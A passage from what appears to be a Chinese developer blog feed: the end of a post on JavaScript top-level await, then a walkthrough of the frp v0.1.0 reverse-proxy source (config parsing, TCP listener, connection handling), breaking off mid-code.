class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">loadConfig</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/config.json&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;配置加载失败&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; loadConfig &#125; <span class="keyword">from</span> <span class="string">&#x27;./config.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 使用顶层 await 确保配置在继续之前被加载</span></span><br><span class="line">  config = <span class="keyword">await</span> <span class="title function_">loadConfig</span>();</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;无法加载配置:&#x27;</span>, error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">applyConfig</span>(config);</span><br></pre></td></tr></table></figure><p>这种写法有个显而易见的好处——我们不需要在主程序中再额外包裹一层 <code>async</code>，而且虽然操作是异步的，但顶层 <strong><code>await</code></strong> 使得代码的读写更像是同步操作，易于理解和维护。</p><p>同时，这种写法也确保了服务的可靠性。如果开发者单纯写一个脚本，然后在主模块中同步加载这个脚本，则很难控制异步操作的结果，因为主模块没法控制异步操作是否完成，以下面的代码为例，usage.js 无法确保自己获得了一个合理的 output 还是一个 <code>undefined</code>。</p><blockquote><p>代码案例来自阅读文档1</p></blockquote><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// awaiting.js</span></span><br><span class="line"><span class="keyword">let</span> output;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> dynamic = <span class="keyword">await</span> <span class="keyword">import</span>(someMission);</span><br><span class="line">  <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">fetch</span>(url);</span><br><span class="line">  output = <span class="title function_">someProcess</span>(dynamic.<span class="property">default</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">main</span>();</span><br><span class="line"><span class="keyword">export</span> &#123; output &#125;;</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// usage.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; output &#125; <span class="keyword">from</span> <span class="string">&quot;./awaiting.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">outputPlusValue</span>(<span class="params">value</span>) &#123; <span class="keyword">return</span> output + value &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">outputPlusValue</span>(<span class="number">100</span>));</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">outputPlusValue</span>(<span class="number">100</span>)), <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>旧版的解决方法是让 awaiting.js 返回一个 Promise 对象，通过这个 Promise 对象判断异步操作是否结束。</p><blockquote><p>代码案例来自阅读文档1</p></blockquote><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// awaiting.js</span></span><br><span class="line"><span class="keyword">let</span> output;</span><br><span class="line"><span class="keyword">export</span> <span class="title function_">default</span> (<span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> dynamic = <span class="keyword">await</span> <span class="keyword">import</span>(someMission);</span><br><span class="line">  <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">fetch</span>(url);</span><br><span class="line">  output = <span class="title function_">someProcess</span>(dynamic.<span class="property">default</span>, data);</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">export</span> &#123; output &#125;;</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// usage.js</span></span><br><span class="line"><span class="keyword">import</span> promise, &#123; output &#125; <span class="keyword">from</span> <span class="string">&quot;./awaiting.js&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">outputPlusValue</span>(<span class="params">value</span>) &#123; <span class="keyword">return</span> output + value &#125;</span><br><span class="line"></span><br><span class="line">promise.<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">outputPlusValue</span>(<span class="number">100</span>));</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">outputPlusValue</span>(<span class="number">100</span>)), <span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这种写法虽然保证了数据的可靠性，但使代码变得臃肿，开发者必需时刻记得在调用这个子模块时要使用 Promise 加载，并且所有依赖这个子模块的模块都需要使用 Promise 加载，一层层地套回去了。而顶层 await 就直接解决了这个问题。</p><h2 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a>小坑</h2><h3 id="混用-await-和-then"><a href="#混用-await-和-then" class="headerlink" title="混用 await 和 .then()"></a>混用 <code>await</code> 和 <code>.then()</code></h3><p>这是一种不被推荐的做法。</p><p>如果你在一个 <strong><code>async</code></strong> 函数中使用 <strong><code>await</code></strong>，然后在同一个 <strong><code>await</code></strong> 调用后面紧接着使用 <strong><code>.then()</code></strong>，这可能会让人困惑，因为它混合了两种不同的风格，使代码的意图不够清晰。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;some-api-url&#x27;</span>)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>业务逻辑明确的话，代码不会给你一拳，但其他开发者会给你一拳。</p><h2 id="阅读文档"><a href="#阅读文档" class="headerlink" title="阅读文档"></a>阅读文档</h2><ol><li><a href="https://es6.ruanyifeng.com/#docs/async">https://es6.ruanyifeng.com/#docs/async</a></li><li><a href="https://www.cnblogs.com/porter/p/13343524.html">https://www.cnblogs.com/porter/p/13343524.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FRPv0.1.0 源码阅读</title>
      <link href="/2024/06/01/2024/frp-read/"/>
      <url>/2024/06/01/2024/frp-read/</url>
      
        <content type="html"><![CDATA[<p>frp 是一款专注于内网穿透的、高性能的反向代理工具，做 Web 安全以及网络开发时常用。就算你没接触过这些领域，室友开黑打游戏时，也可能会使用 <a href="https://www.natfrp.com/">Sakura FRP</a> 做内网穿透实现局域网联机。</p><h2 id="v0-1-0-版本"><a href="#v0-1-0-版本" class="headerlink" title="v0.1.0 版本"></a>v0.1.0 版本</h2><p>v0.1.0 版本的代码量很小，核心功能代码就 1079 行，项目结构也很简单，适合上手。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PROJECT:</span><br><span class="line">└─frp</span><br><span class="line">    ├─conf</span><br><span class="line">    ├─Godeps       </span><br><span class="line">    └─src</span><br><span class="line">        └─frp</span><br><span class="line">            ├─cmd</span><br><span class="line">            │  ├─frpc</span><br><span class="line">            │  └─frps</span><br><span class="line">            ├─models</span><br><span class="line">            │  ├─client | 客户端配置信息 &amp; </span><br><span class="line">            │  ├─consts</span><br><span class="line">            │  ├─msg | 定义请求/响应信息的结构体</span><br><span class="line">            │  └─server | 服务端配置信息 &amp; 处理代理服务器的函数</span><br><span class="line">            └─utils</span><br><span class="line">                ├─broadcast | </span><br><span class="line">                ├─conn | 设置本地监听器 &amp; 获取/发起连接的函数</span><br><span class="line">                ├─<span class="built_in">log</span> | 日志处理</span><br><span class="line">                └─pcrypto</span><br></pre></td></tr></table></figure><p>在开始之前，先了解 Godeps，一个旧时代的包依赖管理工具，原理是扫描记录版本控制的信息，并在 go 命令前加壳以实现依赖管理。不过后来逐渐被大家更为熟知的 <code>go mod</code> 取代了，其 GitHub 仓库也被 archive 了。</p><p>项目中使用该工具管理 Go 依赖库时，会在项目中生成 <code>/Godeps/Godeps.json</code> 配置文件。这里就不在解释了，自己看看就可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;ImportPath&quot;</span>: <span class="string">&quot;frp&quot;</span>,</span><br><span class="line"><span class="string">&quot;GoVersion&quot;</span>: <span class="string">&quot;go1.4&quot;</span>,</span><br><span class="line"><span class="string">&quot;Packages&quot;</span>: [</span><br><span class="line"><span class="string">&quot;./...&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="string">&quot;Deps&quot;</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;ImportPath&quot;</span>: <span class="string">&quot;github.com/astaxie/beego/logs&quot;</span>,</span><br><span class="line"><span class="string">&quot;Comment&quot;</span>: <span class="string">&quot;v1.5.0-9-gfb7314f&quot;</span>,</span><br><span class="line"><span class="string">&quot;Rev&quot;</span>: <span class="string">&quot;fb7314f8ac86b83ccd34386518d97cf2363e2ae5&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;ImportPath&quot;</span>: <span class="string">&quot;github.com/vaughan0/go-ini&quot;</span>,</span><br><span class="line"><span class="string">&quot;Rev&quot;</span>: <span class="string">&quot;a98ad7ee00ec53921f08832bc06ecf7fd600e6a1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>frp 分客户端（frpc）和服务端（frps），使用时是先建立服务端再建立客户端，就按照这个顺序。</p><h3 id="frps"><a href="#frps" class="headerlink" title="frps"></a>frps</h3><p>对应的配置文件如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">log_file</span> = ./frps.log</span><br><span class="line"><span class="comment"># debug, info, warn, error</span></span><br><span class="line"><span class="attr">log_level</span> = debug</span><br><span class="line"><span class="comment"># file, console</span></span><br><span class="line"><span class="attr">log_way</span> = console </span><br><span class="line"></span><br><span class="line"><span class="section">[test1]</span></span><br><span class="line"><span class="attr">passwd</span> = <span class="number">123</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">listen_port</span> = <span class="number">6000</span></span><br></pre></td></tr></table></figure><p>先看项目入口文件，位置是 <code>src/frp/cmd/frps/main.go</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">err := server.LoadConf(<span class="string">&quot;./frps.ini&quot;</span>)</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line">log.InitLog(server.LogWay, server.LogFile, server.LogLevel)</span><br><span class="line"></span><br><span class="line">l, err := conn.Listen(server.BindAddr, server.BindPort)</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line">log.Info(<span class="string">&quot;Start frps success&quot;</span>)</span><br><span class="line">ProcessControlConn(l)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用 <code>src/frp/models/server/config.go</code> 中的 <code>LoadConf</code> 方法加载配置文件；初始化日志记录，使用 server 包中定义的日志记录方式、日志文件和日志级别；建立连接；在前面无误的情况下打印 success 信息；最后调用 <code>ProcessControlConn</code> 函数，处理控制连接。</p><p>然后看 <code>src/frp/models/server/config.go</code>。</p><p>这个文件的功能就是使用 <code>github.com/vaughan0/go-ini</code> 库将配置文件信息映射为结构体，方便后续使用。配置文件可分为两部分，<code>[common]</code> 通用信息和代理服务器信息列表，其中 <code>[common]</code> 如果没在配置文件中指定，就是用该文件开头指定的默认值。其他配置信息都被当做代理服务器信息循环读取，文件开头初始化了一个 <code>ProxyServers</code>  映射，用于存储代理服务器的配置：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ProxyServers <span class="keyword">map</span>[<span class="type">string</span>]*ProxyServer = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]*ProxyServer)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoadConf</span><span class="params">(confFile <span class="type">string</span>)</span></span> (err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">for</span> name, section := <span class="keyword">range</span> conf &#123;</span><br><span class="line"><span class="keyword">if</span> name != <span class="string">&quot;common&quot;</span> &#123;</span><br><span class="line">proxyServer := &amp;ProxyServer&#123;&#125;</span><br><span class="line">proxyServer.Name = name</span><br><span class="line"></span><br><span class="line">proxyServer.Passwd, ok = section[<span class="string">&quot;passwd&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;Parse ini file error: proxy [%s] no passwd found&quot;</span>, proxyServer.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxyServer.BindAddr, ok = section[<span class="string">&quot;bind_addr&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">proxyServer.BindAddr = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">portStr, ok := section[<span class="string">&quot;listen_port&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line">proxyServer.ListenPort, err = strconv.ParseInt(portStr, <span class="number">10</span>, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;Parse ini file error: proxy [%s] listen_port error&quot;</span>, proxyServer.Name)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;Parse ini file error: proxy [%s] listen_port not found&quot;</span>, proxyServer.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxyServer.Init()</span><br><span class="line">ProxyServers[proxyServer.Name] = proxyServer</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 要求至少有一个代理服务器配置选项，如果没有就提示解析错误</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ProxyServers) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;Parse ini file error: no proxy config found&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>日志部分使用的是 <code>github.com/astaxie/beego/logs</code> 三方库。可以不细看，日志部分所需的配置信息由上面所说的配置文件指定的。</p><p>再看 <code>src/frp/utils/conn/conn.go</code>，这部分功能是实现服务端与客户端的连接。</p><p>文件开头定义了一个 <code>Listener</code> 结构体，用于存储 TCP 监听器的地址、监听器对象、连接通道和关闭标志。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Listener <span class="keyword">struct</span> &#123;</span><br><span class="line">addr      net.Addr</span><br><span class="line">l         *net.TCPListener</span><br><span class="line">conns     <span class="keyword">chan</span> *Conn</span><br><span class="line">closeFlag <span class="type">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Listen</code> 函数用于在指定端口启动一个 TCP 监听器，接受绑定的地址和端口号作为参数（配置文件中指定），并返回一个 <code>Listener</code> 对象。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Listen</span><span class="params">(bindAddr <span class="type">string</span>, bindPort <span class="type">int64</span>)</span></span> (l *Listener, err <span class="type">error</span>) &#123;</span><br><span class="line"><span class="comment">// 解析TCP地址，指定 tcp4</span></span><br><span class="line">tcpAddr, err := net.ResolveTCPAddr(<span class="string">&quot;tcp4&quot;</span>, fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, bindAddr, bindPort))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> l, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在解析的TCP地址上开始监听</span></span><br><span class="line">listener, err := net.ListenTCP(<span class="string">&quot;tcp&quot;</span>, tcpAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> l, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用监听器的地址、监听器对象、连接通道和关闭标志初始化 Listener 结构体</span></span><br><span class="line">l = &amp;Listener&#123;</span><br><span class="line">addr:      listener.Addr(),</span><br><span class="line">l:         listener,</span><br><span class="line">conns:     <span class="built_in">make</span>(<span class="keyword">chan</span> *Conn),</span><br><span class="line">closeFlag: <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动一个协程来接受新的连接</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="comment">// 接受新的TCP连接</span></span><br><span class="line">conn, err := l.l.AcceptTCP()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// 如果监听器已经关闭，则返回结束协程</span></span><br><span class="line"><span class="keyword">if</span> l.closeFlag &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果是其他错误，则忽略并继续等待新的连接</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为每个接受的连接创建一个 Conn 实例，并将其发送到 Listener 的连接通道中</span></span><br><span class="line">c := &amp;Conn&#123;</span><br><span class="line">TcpConn:   conn,</span><br><span class="line">closeFlag: <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br><span class="line">c.Reader = bufio.NewReader(c.TcpConn)</span><br><span class="line">l.conns &lt;- c</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">return</span> l, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回的 <code>Listener</code> 是一个准备好接受连接的结构体。这个结构体包含了一个通道（<code>conns</code>），用于接收和存储新的连接。在 <code>Listen</code> 函数内部，有一个协程不断地接受新的连接并将它们放入这个通道。</p><p>我们的目光再返回主函数。主函数建立好上文说的这个 <code>l</code> 后，就认为 frp 已经成功启动了，然后将这个 <code>l</code> 传递给控制模块进行管理，控制模块主体在 <code>src/frp/cmd/frps/control.go</code> 中。</p><p><code>ProcessControlConn</code> 函数启动一个无限循环，调用 <code>l.GetConn()</code> 方法尝试从监听器获取一个新的连接对象 <code>c</code> ：如果成功获取到新的连接，它将为每个新的连接启动一个新的协程 <code>controlWorker(c)</code>，这个协程将独立处理每个连接的控制逻辑；如果 <code>l.GetConn()</code> 返回错误，函数将停止运行。</p><p>这里的连接对象 <code>c</code> 在项目的 <code>utils/conn</code> 中定义：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Conn <span class="keyword">struct</span> &#123;</span><br><span class="line">TcpConn   *net.TCPConn</span><br><span class="line">Reader    *bufio.Reader</span><br><span class="line">closeFlag <span class="type">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Conn</code> 结构体是一个自定义的数据类型，用于封装 TCP 连接及其相关操作：</p><ul><li><code>TcpConn</code>：指向 <code>net.TCPConn</code> 的指针，它代表了底层的 TCP 连接。通过这个字段，可以访问和控制 TCP 网络连接的各种属性和方法，如发送和接收数据。</li><li><code>Reader</code>：指向 <code>bufio.Reader</code> 的指针，它提供了一个缓冲区，可以更高效地读取数据。这个读取器封装了 <code>TcpConn</code>，使得可以方便地进行如按行读取文本等操作。</li><li><code>closeFlag</code>：布尔值，用于指示连接是否已经被关闭。如果为 <code>true</code>，则表示连接已经关闭，不应再进行读写操作。</li></ul><p>然后再看用于处理连接的函数 <code>controlWorker(c)</code>，其中有两个较为关键的函数，均在注释中标注了 <code>★</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">controlWorker</span><span class="params">(c *conn.Conn)</span></span> &#123;</span><br><span class="line"><span class="comment">// 首条消息是从客户端发往服务器的，如果出错则关闭连接。</span></span><br><span class="line">res, err := c.ReadLine()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Read error, %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取成功则继续调试信息，打印返回的消息</span></span><br><span class="line">log.Debug(<span class="string">&quot;get: %s&quot;</span>, res)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将读取到的信息反序列化为 ClientCtlReq 结构体</span></span><br><span class="line">clientCtlReq := 